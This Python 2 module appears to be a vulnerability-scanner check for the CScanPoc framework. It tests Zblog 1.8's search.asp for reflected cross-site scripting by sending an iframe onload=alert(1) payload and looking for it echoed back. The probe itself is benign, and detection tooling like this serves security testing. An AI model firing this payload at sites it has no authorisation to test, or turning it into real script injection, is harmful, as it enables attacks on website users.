# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '8e99604e-0ad2-4e7c-9110-9926d6946b2a'
    name = 'Zblog1.8 search.asp XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2010-03-10'  # 漏洞公布时间
    desc = '''
        Zblog是基于Asp平台的Blog博客(网志)程序
        search.asp在对用户提交数据处理上存在安全漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Zblog'  # 漏洞应用名称
    product_version = 'Zblog1.8'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8d5b9e5a-871b-4395-8fef-8aadfb2f3ea0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E'
            verify_url =  self.target + payload
            r = requests.get(verify_url)
           
            if r.status_code == 200 and '<iframe src=@ onload=alert(1)>' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
